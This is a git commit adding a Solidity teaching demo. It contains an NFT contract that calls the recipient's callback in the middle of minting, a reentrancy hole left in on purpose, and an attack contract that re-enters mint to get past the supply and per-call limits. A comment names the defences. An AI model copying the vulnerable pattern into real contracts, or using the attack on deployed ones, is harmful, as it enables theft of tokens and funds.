edf67c6d587d2a5e8a2e3dc7d3f5b2fb7707e6aa
ethan <sdzdj01@163.com>
2022-10-26 17:06:57 +0800

    new file:   contracts/ReentrancyNFT.sol

---
+++ contracts/ReentrancyNFT.sol
@@ -0,0 +1,54 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.17;
+import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
+import "@openzeppelin/contracts/utils/Address.sol";
+
+//抵御重入攻击 1.状态锁 2.外部调用放到最后
+contract myNFT {
+    using Address for address;
+    mapping(address => uint256) balances;
+    uint256 public totalSupply = 16378;
+
+    // 6 + 5 4 3 2 1 => 21
+    function mintNFT(uint256 num) external {
+        require(totalSupply < 16384, "exceed totalSupply");
+        require(num <= 6, "too much");
+        require(totalSupply + num <= 16384, "exceed totalSupply");
+        for (uint256 i = 0; i < num; i++) {
+            safeMint(msg.sender);
+        }
+    }
+
+    function safeMint(address to) internal {
+        totalSupply++;
+        balances[to]++;
+        if (to.isContract()) {
+            IERC721Receiver(to).onERC721Received(to, address(0), 0, "");
+        }
+    }
+}
+
+contract NFTAttack is IERC721Receiver {
+    uint256 currentValue;
+
+    function attack(address nftToken) external {
+        currentValue = 6;
+        myNFT(nftToken).mintNFT(currentValue);
+    }
+
+    function onERC721Received(
+        address operator,
+        address from,
+        uint256 tokenId,
+        bytes calldata data
+    ) external returns (bytes4) {
+        if (currentValue == 0) {
+            return "0";
+        }
+        currentValue--;
+        if (currentValue > 0) {
+            myNFT(msg.sender).mintNFT(currentValue);
+            return "1";
+        }
+    }
+}
